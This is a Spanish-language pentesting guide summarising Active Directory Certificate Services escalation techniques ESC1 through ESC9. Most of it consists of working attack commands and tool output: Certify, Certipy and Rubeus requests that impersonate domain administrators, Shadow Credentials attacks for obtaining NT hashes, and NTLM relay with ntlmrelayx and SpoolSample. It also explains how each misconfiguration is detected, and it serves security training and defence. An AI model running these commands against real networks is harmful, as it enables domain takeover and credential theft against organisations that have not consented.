# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}

**Este es un resumen de las secciones de técnicas de escalación de las publicaciones:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Plantillas de Certificado Mal Configuradas - ESC1

### Explicación

### Plantillas de Certificado Mal Configuradas - ESC1 Explicado

- **Los derechos de inscripción son otorgados a usuarios de bajo privilegio por la CA Empresarial.**
- **No se requiere aprobación del gerente.**
- **No se necesitan firmas de personal autorizado.**
- **Los descriptores de seguridad en las plantillas de certificado son excesivamente permisivos, permitiendo a usuarios de bajo privilegio obtener derechos de inscripción.**
- **Las plantillas de certificado están configuradas para definir EKUs que facilitan la autenticación:**
- Se incluyen identificadores de Uso Extendido de Clave (EKU) como Autenticación de Cliente (OID 1.3.6.1.5.5.7.3.2), Autenticación de Cliente PKINIT (1.3.6.1.5.2.3.4), Inicio de Sesión con Tarjeta Inteligente (OID 1.3.6.1.4.1.311.20.2.2), Cualquier Propósito (OID 2.5.29.37.0), o sin EKU (SubCA).
- **La plantilla permite a los solicitantes incluir un subjectAltName en la Solicitud de Firma de Certificado (CSR):**
- Active Directory (AD) prioriza el subjectAltName (SAN) en un certificado para la verificación de identidad si está presente. Esto significa que al especificar el SAN en un CSR, se puede solicitar un certificado para suplantar a cualquier usuario (por ejemplo, un administrador de dominio). Si un SAN puede ser especificado por el solicitante se indica en el objeto AD de la plantilla de certificado a través de la propiedad `mspki-certificate-name-flag`. Esta propiedad es una máscara de bits, y la presencia de la bandera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite la especificación del SAN por el solicitante.

> [!CAUTION]
> La configuración descrita permite a usuarios de bajo privilegio solicitar certificados con cualquier SAN de su elección, habilitando la autenticación como cualquier principal de dominio a través de Kerberos o SChannel.

Esta característica a veces se habilita para soportar la generación en tiempo real de certificados HTTPS o de host por productos o servicios de implementación, o debido a una falta de comprensión.

Se observa que crear un certificado con esta opción activa un aviso, lo cual no ocurre cuando se duplica una plantilla de certificado existente (como la plantilla `WebServer`, que tiene `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada) y luego se modifica para incluir un OID de autenticación.

### Abuso

Para **encontrar plantillas de certificado vulnerables** puedes ejecutar:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Para **abusar de esta vulnerabilidad para hacerse pasar por un administrador** se podría ejecutar:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Luego puedes transformar el **certificado generado a formato `.pfx`** y usarlo para **autenticarte usando Rubeus o certipy** nuevamente:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Los binarios de Windows "Certreq.exe" y "Certutil.exe" se pueden utilizar para generar el PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

La enumeración de plantillas de certificados dentro del esquema de configuración del bosque de AD, específicamente aquellas que no requieren aprobación o firmas, que poseen un EKU de Autenticación de Cliente o Inicio de Sesión con Tarjeta Inteligente, y con la bandera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada, se puede realizar ejecutando la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Plantillas de Certificado Mal Configuradas - ESC2

### Explicación

El segundo escenario de abuso es una variación del primero:

1. Se otorgan derechos de inscripción a usuarios de bajo privilegio por la CA Empresarial.
2. Se desactiva el requisito de aprobación del gerente.
3. Se omite la necesidad de firmas autorizadas.
4. Un descriptor de seguridad excesivamente permisivo en la plantilla de certificado otorga derechos de inscripción de certificado a usuarios de bajo privilegio.
5. **La plantilla de certificado está definida para incluir el EKU de Cualquier Propósito o ningún EKU.**

El **EKU de Cualquier Propósito** permite que un atacante obtenga un certificado para **cualquier propósito**, incluyendo autenticación de cliente, autenticación de servidor, firma de código, etc. La misma **técnica utilizada para ESC3** se puede emplear para explotar este escenario.

Los certificados con **sin EKUs**, que actúan como certificados de CA subordinada, pueden ser explotados para **cualquier propósito** y **también pueden ser utilizados para firmar nuevos certificados**. Por lo tanto, un atacante podría especificar EKUs o campos arbitrarios en los nuevos certificados utilizando un certificado de CA subordinada.

Sin embargo, los nuevos certificados creados para **autenticación de dominio** no funcionarán si la CA subordinada no es confiable por el objeto **`NTAuthCertificates`**, que es la configuración predeterminada. No obstante, un atacante aún puede crear **nuevos certificados con cualquier EKU** y valores de certificado arbitrarios. Estos podrían ser potencialmente **abusados** para una amplia gama de propósitos (por ejemplo, firma de código, autenticación de servidor, etc.) y podrían tener implicaciones significativas para otras aplicaciones en la red como SAML, AD FS o IPSec.

Para enumerar las plantillas que coinciden con este escenario dentro del esquema de configuración del Bosque AD, se puede ejecutar la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Plantillas de Agente de Inscripción Mal Configuradas - ESC3

### Explicación

Este escenario es como el primero y el segundo, pero **abusando** de un **EKU** (Agente de Solicitud de Certificado) **diferente** y **2 plantillas diferentes** (por lo tanto, tiene 2 conjuntos de requisitos).

El **EKU de Agente de Solicitud de Certificado** (OID 1.3.6.1.4.1.311.20.2.1), conocido como **Agente de Inscripción** en la documentación de Microsoft, permite a un principal **inscribirse** para un **certificado** en **nombre de otro usuario**.

El **“agente de inscripción”** se inscribe en tal **plantilla** y utiliza el **certificado resultante para co-firmar un CSR en nombre del otro usuario**. Luego **envía** el **CSR co-firmado** a la CA, inscribiéndose en una **plantilla** que **permite “inscribirse en nombre de”**, y la CA responde con un **certificado que pertenece al “otro” usuario**.

**Requisitos 1:**

- Los derechos de inscripción son otorgados a usuarios de bajo privilegio por la CA Empresarial.
- Se omite el requisito de aprobación del gerente.
- No hay requisito de firmas autorizadas.
- El descriptor de seguridad de la plantilla de certificado es excesivamente permisivo, otorgando derechos de inscripción a usuarios de bajo privilegio.
- La plantilla de certificado incluye el EKU de Agente de Solicitud de Certificado, permitiendo la solicitud de otras plantillas de certificado en nombre de otros principales.

**Requisitos 2:**

- La CA Empresarial otorga derechos de inscripción a usuarios de bajo privilegio.
- Se elude la aprobación del gerente.
- La versión del esquema de la plantilla es 1 o supera 2, y especifica un Requisito de Política de Aplicación que requiere el EKU de Agente de Solicitud de Certificado.
- Un EKU definido en la plantilla de certificado permite la autenticación de dominio.
- No se aplican restricciones para agentes de inscripción en la CA.

### Abuso

Puedes usar [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) para abusar de este escenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Los **usuarios** que están autorizados a **obtener** un **certificado de agente de inscripción**, las plantillas en las que se permite a los **agentes** de inscripción inscribirse, y las **cuentas** en nombre de las cuales el agente de inscripción puede actuar pueden ser restringidos por CAs empresariales. Esto se logra abriendo el `certsrc.msc` **complemento**, **haciendo clic derecho en la CA**, **haciendo clic en Propiedades**, y luego **navegando** a la pestaña “Agentes de Inscripción”.

Sin embargo, se observa que la configuración **predeterminada** para las CAs es “**No restringir agentes de inscripción**.” Cuando la restricción sobre los agentes de inscripción es habilitada por los administradores, configurarla en “Restringir agentes de inscripción,” la configuración predeterminada sigue siendo extremadamente permisiva. Permite el acceso a **Todos** para inscribirse en todas las plantillas como cualquier persona.

## Control de Acceso a Plantillas de Certificado Vulnerables - ESC4

### **Explicación**

El **descriptor de seguridad** en las **plantillas de certificado** define los **permisos** específicos que los **principales de AD** poseen con respecto a la plantilla.

Si un **atacante** posee los **permisos** necesarios para **alterar** una **plantilla** e **instituir** cualquier **mala configuración explotable** descrita en **secciones anteriores**, se podría facilitar la escalada de privilegios.

Los permisos notables aplicables a las plantillas de certificado incluyen:

- **Owner:** Concede control implícito sobre el objeto, permitiendo la modificación de cualquier atributo.
- **FullControl:** Habilita autoridad completa sobre el objeto, incluida la capacidad de alterar cualquier atributo.
- **WriteOwner:** Permite la alteración del propietario del objeto a un principal bajo el control del atacante.
- **WriteDacl:** Permite el ajuste de controles de acceso, potencialmente otorgando a un atacante FullControl.
- **WriteProperty:** Autoriza la edición de cualquier propiedad del objeto.

### Abuso

Un ejemplo de un privesc como el anterior:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 es cuando un usuario tiene privilegios de escritura sobre una plantilla de certificado. Esto puede, por ejemplo, ser abusado para sobrescribir la configuración de la plantilla de certificado para hacer que la plantilla sea vulnerable a ESC1.

Como podemos ver en la ruta anterior, solo `JOHNPC` tiene estos privilegios, pero nuestro usuario `JOHN` tiene el nuevo borde `AddKeyCredentialLink` a `JOHNPC`. Dado que esta técnica está relacionada con certificados, también he implementado este ataque, que se conoce como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aquí hay un pequeño adelanto del comando `shadow auto` de Certipy para recuperar el hash NT de la víctima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** puede sobrescribir la configuración de una plantilla de certificado con un solo comando. Por **defecto**, Certipy **sobrescribirá** la configuración para hacerla **vulnerable a ESC1**. También podemos especificar el **`-save-old` parameter para guardar la configuración antigua**, lo que será útil para **restaurar** la configuración después de nuestro ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Control de Acceso a Objetos PKI Vulnerables - ESC5

### Explicación

La extensa red de relaciones interconectadas basadas en ACL, que incluye varios objetos más allá de las plantillas de certificados y la autoridad de certificación, puede afectar la seguridad de todo el sistema AD CS. Estos objetos, que pueden afectar significativamente la seguridad, abarcan:

- El objeto de computadora AD del servidor CA, que puede ser comprometido a través de mecanismos como S4U2Self o S4U2Proxy.
- El servidor RPC/DCOM del servidor CA.
- Cualquier objeto o contenedor AD descendiente dentro de la ruta de contenedor específica `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Esta ruta incluye, pero no se limita a, contenedores y objetos como el contenedor de Plantillas de Certificados, el contenedor de Autoridades de Certificación, el objeto NTAuthCertificates y el Contenedor de Servicios de Inscripción.

La seguridad del sistema PKI puede verse comprometida si un atacante de bajo privilegio logra tomar el control de cualquiera de estos componentes críticos.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicación

El tema discutido en el [**post de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) también toca las implicaciones de la bandera **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, como lo describe Microsoft. Esta configuración, cuando se activa en una Autoridad de Certificación (CA), permite la inclusión de **valores definidos por el usuario** en el **nombre alternativo del sujeto** para **cualquier solicitud**, incluidas aquellas construidas a partir de Active Directory®. En consecuencia, esta disposición permite a un **intruso** inscribirse a través de **cualquier plantilla** configurada para la **autenticación** de dominio—específicamente aquellas abiertas a la inscripción de usuarios **no privilegiados**, como la plantilla de Usuario estándar. Como resultado, se puede asegurar un certificado, permitiendo al intruso autenticarse como un administrador de dominio o **cualquier otra entidad activa** dentro del dominio.

**Nota**: El enfoque para agregar **nombres alternativos** en una Solicitud de Firma de Certificado (CSR), a través del argumento `-attrib "SAN:"` en `certreq.exe` (denominado “Pares de Nombre y Valor”), presenta un **contraste** con la estrategia de explotación de SANs en ESC1. Aquí, la distinción radica en **cómo se encapsula la información de la cuenta**—dentro de un atributo de certificado, en lugar de una extensión.

### Abuso

Para verificar si la configuración está activada, las organizaciones pueden utilizar el siguiente comando con `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Esta operación emplea esencialmente **acceso remoto al registro**, por lo tanto, un enfoque alternativo podría ser:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Herramientas como [**Certify**](https://github.com/GhostPack/Certify) y [**Certipy**](https://github.com/ly4k/Certipy) son capaces de detectar esta mala configuración y explotarla:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Para alterar estas configuraciones, asumiendo que se posee derechos **administrativos de dominio** o equivalentes, se puede ejecutar el siguiente comando desde cualquier estación de trabajo:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Para deshabilitar esta configuración en su entorno, se puede eliminar la bandera con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Después de las actualizaciones de seguridad de mayo de 2022, los **certificados** emitidos recientemente contendrán una **extensión de seguridad** que incorpora la propiedad `objectSid` del **solicitante**. Para ESC1, este SID se deriva del SAN especificado. Sin embargo, para **ESC6**, el SID refleja el **objectSid** del **solicitante**, no el SAN.\
> Para explotar ESC6, es esencial que el sistema sea susceptible a ESC10 (Mapeos de Certificados Débiles), que prioriza el **SAN sobre la nueva extensión de seguridad**.

## Control de Acceso de Autoridad de Certificación Vulnerable - ESC7

### Ataque 1

#### Explicación

El control de acceso para una autoridad de certificación se mantiene a través de un conjunto de permisos que rigen las acciones de la CA. Estos permisos se pueden ver accediendo a `certsrv.msc`, haciendo clic derecho en una CA, seleccionando propiedades y luego navegando a la pestaña de Seguridad. Además, los permisos se pueden enumerar utilizando el módulo PSPKI con comandos como:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Esto proporciona información sobre los derechos principales, a saber, **`ManageCA`** y **`ManageCertificates`**, que se correlacionan con los roles de “administrador de CA” y “gerente de certificados” respectivamente.

#### Abuso

Tener derechos de **`ManageCA`** en una autoridad de certificación permite al principal manipular configuraciones de forma remota utilizando PSPKI. Esto incluye activar el flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir la especificación de SAN en cualquier plantilla, un aspecto crítico de la escalación de dominio.

La simplificación de este proceso se puede lograr mediante el uso del cmdlet **Enable-PolicyModuleFlag** de PSPKI, que permite modificaciones sin interacción directa con la GUI.

La posesión de derechos de **`ManageCertificates`** facilita la aprobación de solicitudes pendientes, eludiendo efectivamente la salvaguarda de "aprobación del gerente de certificados de CA".

Se puede utilizar una combinación de módulos **Certify** y **PSPKI** para solicitar, aprobar y descargar un certificado:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicación

> [!WARNING]
> En el **ataque anterior**, se utilizaron los permisos de **`Manage CA`** para **habilitar** la bandera **EDITF_ATTRIBUTESUBJECTALTNAME2** para realizar el **ataque ESC6**, pero esto no tendrá ningún efecto hasta que se reinicie el servicio de CA (`CertSvc`). Cuando un usuario tiene el derecho de acceso **`Manage CA`**, también se le permite **reiniciar el servicio**. Sin embargo, **no significa que el usuario pueda reiniciar el servicio de forma remota**. Además, **ESC6 puede no funcionar de inmediato** en la mayoría de los entornos parcheados debido a las actualizaciones de seguridad de mayo de 2022.

Por lo tanto, aquí se presenta otro ataque.

Requisitos previos:

- Solo permiso **`ManageCA`**
- Permiso **`Manage Certificates`** (se puede otorgar desde **`ManageCA`**)
- La plantilla de certificado **`SubCA`** debe estar **habilitada** (se puede habilitar desde **`ManageCA`**)

La técnica se basa en el hecho de que los usuarios con el derecho de acceso **`Manage CA`** _y_ **`Manage Certificates`** pueden **emitir solicitudes de certificados fallidas**. La plantilla de certificado **`SubCA`** es **vulnerable a ESC1**, pero **solo los administradores** pueden inscribirse en la plantilla. Así, un **usuario** puede **solicitar** inscribirse en la **`SubCA`** - lo cual será **denegado** - pero **luego emitido por el gerente posteriormente**.

#### Abuso

Puedes **otorgarte a ti mismo el derecho de acceso `Manage Certificates`** agregando tu usuario como un nuevo oficial.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
La **`SubCA`** plantilla se puede **habilitar en la CA** con el parámetro `-enable-template`. Por defecto, la plantilla `SubCA` está habilitada.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si hemos cumplido con los requisitos previos para este ataque, podemos comenzar **solicitando un certificado basado en la plantilla `SubCA`**.

**Esta solicitud será denegada**, pero guardaremos la clave privada y anotaremos el ID de la solicitud.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con nuestro **`Manage CA` y `Manage Certificates`**, podemos **emitir la solicitud de certificado fallida** con el comando `ca` y el parámetro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Y finalmente, podemos **recuperar el certificado emitido** con el comando `req` y el parámetro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Ataque 3 – Abuso de la Extensión de Gestión de Certificados (SetExtension)

#### Explicación

Además de los abusos clásicos de ESC7 (habilitar atributos EDITF o aprobar solicitudes pendientes), **Certify 2.0** reveló un nuevo primitivo que solo requiere el rol de *Gestionar Certificados* (también conocido como **Gerente / Oficial de Certificados**) en la CA Empresarial.

El método RPC `ICertAdmin::SetExtension` puede ser ejecutado por cualquier principal que tenga *Gestionar Certificados*. Mientras que el método se utilizaba tradicionalmente por CAs legítimas para actualizar extensiones en solicitudes **pendientes**, un atacante puede abusar de él para **agregar una *extensión de certificado no predeterminada*** (por ejemplo, un OID de *Política de Emisión de Certificados* personalizado como `1.1.1.1`) a una solicitud que está esperando aprobación.

Debido a que la plantilla objetivo **no define un valor predeterminado para esa extensión**, la CA NO sobrescribirá el valor controlado por el atacante cuando la solicitud sea finalmente emitida. Por lo tanto, el certificado resultante contiene una extensión elegida por el atacante que puede:

* Satisfacer los requisitos de Política de Aplicación / Emisión de otras plantillas vulnerables (lo que lleva a la escalada de privilegios).
* Inyectar EKUs adicionales o políticas que otorgan al certificado una confianza inesperada en sistemas de terceros.

En resumen, *Gestionar Certificados* – anteriormente considerado la mitad “menos poderosa” de ESC7 – ahora puede ser aprovechado para una escalada de privilegios completa o persistencia a largo plazo, sin tocar la configuración de la CA o requerir el derecho más restrictivo de *Gestionar CA*.

#### Abusando del primitivo con Certify 2.0

1. **Enviar una solicitud de certificado que permanecerá *pendiente*.** Esto se puede forzar con una plantilla que requiera aprobación de un gerente:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Toma nota del ID de Solicitud devuelto
```

2. **Agregar una extensión personalizada a la solicitud pendiente** utilizando el nuevo comando `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # OID de política de emisión falsa
```
*Si la plantilla no define ya la extensión de *Políticas de Emisión de Certificados*, el valor anterior se preservará después de la emisión.*

3. **Emitir la solicitud** (si tu rol también tiene derechos de aprobación de *Gestionar Certificados*) o esperar a que un operador la apruebe. Una vez emitido, descarga el certificado:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. El certificado resultante ahora contiene el OID de política de emisión malicioso y puede ser utilizado en ataques posteriores (por ejemplo, ESC13, escalada de dominio, etc.).

> NOTA: El mismo ataque se puede ejecutar con Certipy ≥ 4.7 a través del comando `ca` y el parámetro `-set-extension`.

## Relevo NTLM a Puntos Finales HTTP de AD CS – ESC8

### Explicación

> [!TIP]
> En entornos donde **AD CS está instalado**, si existe un **punto final de inscripción web vulnerable** y al menos una **plantilla de certificado está publicada** que permite **inscripción de computadoras de dominio y autenticación de clientes** (como la plantilla predeterminada **`Machine`**), se vuelve posible que **cualquier computadora con el servicio de spooler activo sea comprometida por un atacante**!

Varios **métodos de inscripción basados en HTTP** son soportados por AD CS, disponibles a través de roles de servidor adicionales que los administradores pueden instalar. Estas interfaces para la inscripción de certificados basada en HTTP son susceptibles a **ataques de relevo NTLM**. Un atacante, desde una **máquina comprometida, puede suplantar cualquier cuenta de AD que se autentique a través de NTLM entrante**. Mientras suplantan la cuenta de la víctima, estas interfaces web pueden ser accedidas por un atacante para **solicitar un certificado de autenticación de cliente utilizando las plantillas de certificado `User` o `Machine`**.

- La **interfaz de inscripción web** (una aplicación ASP más antigua disponible en `http://<caserver>/certsrv/`), por defecto solo admite HTTP, lo que no ofrece protección contra ataques de relevo NTLM. Además, permite explícitamente solo la autenticación NTLM a través de su encabezado HTTP de Autorización, lo que hace que métodos de autenticación más seguros como Kerberos sean inaplicables.
- El **Servicio de Inscripción de Certificados** (CES), el **Servicio Web de Política de Inscripción de Certificados** (CEP) y el **Servicio de Inscripción de Dispositivos de Red** (NDES) por defecto soportan autenticación negociada a través de su encabezado HTTP de Autorización. La autenticación negociada **soporta tanto** Kerberos como **NTLM**, permitiendo a un atacante **reducir a NTLM** la autenticación durante ataques de relevo. Aunque estos servicios web habilitan HTTPS por defecto, HTTPS solo **no protege contra ataques de relevo NTLM**. La protección contra ataques de relevo NTLM para servicios HTTPS solo es posible cuando HTTPS se combina con enlace de canal. Lamentablemente, AD CS no activa la Protección Extendida para la Autenticación en IIS, que es necesaria para el enlace de canal.

Un **problema** común con los ataques de relevo NTLM es la **corta duración de las sesiones NTLM** y la incapacidad del atacante para interactuar con servicios que **requieren firma NTLM**.

Sin embargo, esta limitación se supera al explotar un ataque de relevo NTLM para adquirir un certificado para el usuario, ya que el período de validez del certificado dicta la duración de la sesión, y el certificado puede ser empleado con servicios que **exigen firma NTLM**. Para instrucciones sobre cómo utilizar un certificado robado, consulta:

{{#ref}}
account-persistence.md
{{#endref}}

Otra limitación de los ataques de relevo NTLM es que **una máquina controlada por el atacante debe ser autenticada por una cuenta víctima**. El atacante podría esperar o intentar **forzar** esta autenticación:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumera **puntos finales HTTP AD CS habilitados**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propiedad `msPKI-Enrollment-Servers` es utilizada por las Autoridades de Certificación (CAs) empresariales para almacenar los puntos finales del Servicio de Inscripción de Certificados (CES). Estos puntos finales pueden ser analizados y listados utilizando la herramienta **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

La solicitud de un certificado es realizada por Certipy por defecto basada en la plantilla `Machine` o `User`, determinada por si el nombre de la cuenta que se está retransmitiendo termina en `$`. La especificación de una plantilla alternativa se puede lograr mediante el uso del parámetro `-template`.

Una técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) puede ser empleada para forzar la autenticación. Al tratar con controladores de dominio, se requiere la especificación de `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicación

El nuevo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) para **`msPKI-Enrollment-Flag`**, conocido como ESC9, impide la inclusión de la **nueva extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`** en un certificado. Esta bandera se vuelve relevante cuando `StrongCertificateBindingEnforcement` está configurado en `1` (la configuración predeterminada), lo que contrasta con una configuración de `2`. Su relevancia aumenta en escenarios donde un mapeo de certificado más débil para Kerberos o Schannel podría ser explotado (como en ESC10), dado que la ausencia de ESC9 no alteraría los requisitos.

Las condiciones bajo las cuales la configuración de esta bandera se vuelve significativa incluyen:

- `StrongCertificateBindingEnforcement` no se ajusta a `2` (siendo la predeterminada `1`), o `CertificateMappingMethods` incluye la bandera `UPN`.
- El certificado está marcado con la bandera `CT_FLAG_NO_SECURITY_EXTENSION` dentro de la configuración de `msPKI-Enrollment-Flag`.
- Cualquier EKU de autenticación de cliente está especificado por el certificado.
- Se dispone de permisos `GenericWrite` sobre cualquier cuenta para comprometer a otra.

### Escenario de Abuso

Supongamos que `John@corp.local` tiene permisos `GenericWrite` sobre `Jane@corp.local`, con el objetivo de comprometer `Administrator@corp.local`. La plantilla de certificado `ESC9`, en la que `Jane@corp.local` tiene permiso para inscribirse, está configurada con la bandera `CT_FLAG_NO_SECURITY_EXTENSION` en su configuración de `msPKI-Enrollment-Flag`.

Inicialmente, el hash de `Jane` se adquiere utilizando Credenciales de Sombra, gracias a `GenericWrite` de `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
